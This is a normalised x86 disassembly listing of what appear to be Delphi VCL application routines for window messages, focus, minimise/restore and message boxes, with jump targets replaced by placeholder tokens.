mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4683a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_44f2dc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_467ec8
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_466c7c
push ebp
call sub_46773c
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46773c
pop ecx
jmp [ eax * 4 + jump_table_467868 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_44f2dc
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46827c
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453c54
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4676d0
push ebp
call sub_46773c
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46773c
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46773c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420574
jmp r-xdata
xor eax eax
call sub_45f5f4
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_44f2dc
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_449ca8
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467ee4
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46773c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_464e7c
jmp r-xdata
push ebp
call sub_46773c
pop ecx
jmp r-xdata
push ebp
call sub_467778
pop ecx
jmp r-xdata
push ebp
call sub_46773c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4675dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467f94
jmp r-xdata
jmp r-xdata
call sub_43936c
call sub_43944c
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4675cc
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4675dc
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4675d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45f4a4
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46773c
pop ecx
jmp r-xdata
call sub_45f558
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46773c
pop ecx
jmp r-xdata
call sub_43936c
call sub_4394a8
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d13c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_467ee4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4675cc
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_466efc
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_44f2dc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_44f2dc
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_467f94
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_466efc
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_44f2dc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_4675dc
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_44f2dc
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_462c08
mov eax [ ebx + 0x44 ]
call sub_465024
sub_468094
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_4680d0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40405c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_4040f8
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46811c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_468140
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_468190
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_4459d4
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_44f2dc
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_468248
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4691a8
sub_46827c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_44f2dc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_40348c
test al al
jne r-xdata
sub_4682e8
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_468248
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_468140
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_468190
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46811c
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_468380
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4682e8
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_468c50
sub_4683a4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4182f0
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4181b4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_468400
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418310
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418200
jmp r-xdata
sub_468494
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_4684d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44f2b8
mov [ esi + 0x44 ] edi
sub_468514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_4685f2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45f41c
call sub_407d10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4685f9
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_462c08
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_4685b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_468380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_461b10
mov eax [ ebp - 0x4 ]
call sub_467ee4
jmp r-xdata
sub_468614
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b6c8
call sub_40275c
mov edx [ rw-data ]
call sub_40341c
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_46880c
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_4686a4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45f4a4
mov [ ebp - 0x10 ] eax
call sub_45f3c0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_467648
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_4687f9
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468800
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_45f558
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45f3c8
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46880c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4688c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_4680d0
mov eax [ ebp - 0x108 ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax ebx
pop ecx
call sub_4686a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4688ce
lea eax [ ebp - 0x108 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4084d0
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d98
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bb0
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4042d0
sub_4688e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44f478
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44f5e0
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_468f88
test al al
je r-xdata
call sub_44f2dc
mov ebp eax
mov eax edi
call sub_44f2dc
mov ebp eax
mov eax esi
call sub_468f88
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_468a4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_468aa4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_468f88
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4697d4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468aab
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_468ab4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_468b0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_468f88
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4697d4
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b13
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_468b24
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403290
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_448c94
jmp r-xdata
sub_468b74
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_466120
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46610c
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_468bd8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_4473a0
mov edi eax
call sub_445c9c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_449ca8
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_449ca8
sub_468c50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468d60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_468bd8
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
